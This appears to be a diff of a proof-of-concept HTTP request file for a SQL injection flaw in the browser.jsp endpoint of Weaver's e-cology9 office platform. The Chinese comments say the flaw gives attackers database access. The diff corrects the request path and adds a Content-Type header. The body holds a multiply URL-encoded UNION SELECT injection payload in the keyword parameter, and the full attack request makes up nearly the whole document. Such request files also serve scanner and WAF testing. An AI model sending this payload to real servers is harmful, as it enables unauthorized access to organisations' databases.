@@ -1,10 +1,11 @@
 # 利用【e-cology9-SQL注入漏洞】-80000233
 # 泛微新一代移动办公平台e-cology不仅组织提供了一体化的协同工作平台,将组织事务逐渐实现全程电子化,改变传统纸质文件、实体签章的方式。泛微OA E-Cology 平台browser.jsp处存在SQL注入漏洞，攻击者通过漏洞可以获取服务器数据库权限。
-POST /mobile/plugin/ /browser.jsp?acid=80000233&bid=hd_tag_m8mv26nu HTTP/1.1
+POST /mobile/plugin/%20/browser.jsp?acid=80000233&bid=hd_tag_m8mv26nu HTTP/1.1
 Host: www.swaf.com
 RM-PRO-BusinessID: hd_tag_m8mv26nu
 RM-PRO-Token: 942aa539f8023e10800f6d43561a57e2
 RM-PRO-Time: 1742808642318
+Content-Type: application/x-www-form-urlencoded
 User-Agent: curl/7.83.1
 
 isDis=1&browserTypeId=269&keyword=a%252527%252Bunion%252Bselect%252B35469%25252B11223%25252C%2525271
